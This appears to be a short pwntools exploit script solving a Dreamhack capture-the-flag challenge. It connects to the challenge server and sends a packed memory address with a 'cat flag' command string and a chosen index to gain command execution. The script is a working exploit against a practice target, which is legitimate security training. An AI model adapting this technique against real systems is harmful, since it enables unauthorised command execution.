from pwn import *
from pwn import p32


p = remote("host3.dreamhack.games",19885)

p.recvuntil(b"name: ")
p.send(p32(0x804a0ac+4) + b"cat flag")
p.sendafter(b"want?: ", b'19')

p.interactive()